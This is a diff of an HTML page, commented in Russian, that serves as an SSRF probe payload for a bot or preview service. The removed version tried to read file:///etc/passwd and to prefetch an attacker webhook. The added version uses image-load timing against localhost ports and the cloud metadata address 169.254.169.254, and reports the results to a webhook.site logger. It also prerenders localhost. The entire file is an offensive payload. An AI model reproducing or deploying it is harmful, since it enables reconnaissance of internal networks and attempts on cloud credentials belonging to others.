@@ -1,33 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Image Preview Test</title>
-</head>
 <body>
     <script>
-        const target = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349"; // СМЕНИ ДОМЕН!
+        const hook = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349";
 
-        function report(path) {
-            var img = new Image();
-            img.src = target + "/" + path + "?t=" + Date.now();
+        function probe(url, label) {
+            const start = Date.now();
+            const img = new Image();
+            
+            img.onload = () => {
+                const diff = Date.now() - start;
+                new Image().src = `${hook}/ALIVE_${label}?ms=${diff}`;
+            };
+            
+            img.onerror = () => {
+                const diff = Date.now() - start;
+                // Важно: если порт закрыт, ошибка прилетит мгновенно (0-10мс)
+                // Если порт открыт, но это не картинка, ошибка прилетит позже (50-500мс)
+                new Image().src = `${hook}/RESULT_${label}?ms=${diff}`;
+            };
+
+            img.src = url;
         }
 
-        // Попытка №1: Проверка локального файла через Error-based SSRF
-        // Если картинка "не грузится", мы узнаем, есть ли там файл
-        var testLfi = new Image();
-        testLfi.onload = () => report("LFI_SUCCESS_FILE_EXISTS");
-        testLfi.onerror = () => report("LFI_FAILED_OR_BLOCKED");
-        testLfi.src = "file:///etc/passwd"; 
+        // 1. Проверяем то то, что ТОЧНО есть (локальный веб-интерфейс)
+        probe("http://127.0.0.1:80/favicon.ico", "LOCAL_80");
 
-        // Попытка №2: Обход фильтра расширений
-        // Мы просим бота скачать "картинку", которая на самом деле ведет на наш логгер
-        var trigger = document.createElement('link');
-        trigger.rel = "prefetch";
-        trigger.href = target + "/BOT_TRIGGERED_PREFETCH";
-        document.head.appendChild(trigger);
+        // 2. Проверяем облачные метаданные (если это AWS/Azure/GCP)
+        probe("http://169.254.169.254/latest/meta-data/", "METADATA");
+
+        // 3. Проверяем ПОРТ, КОТОРОГО НЕТ (для эталона времени)
+        probe("http://127.0.0.1:1337/nonexistent", "CLOSED_PORT");
+
+        // 4. Попытка вытащить данные через redirect (если бот следует за 302)
+        // Мы отправляем его на "картинку", которая на самом деле является скриптом
+        var leak = document.createElement('link');
+        leak.rel = "prerender";
+        leak.href = "http://127.0.0.1:80/";
+        document.head.appendChild(leak);
+        
     </script>
-
-    <link rel="stylesheet" href="http://127.0.0.1:80/style.css" onerror="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/LOCAL_PORT_80_ALIVE'">
-
 </body>
 </html>
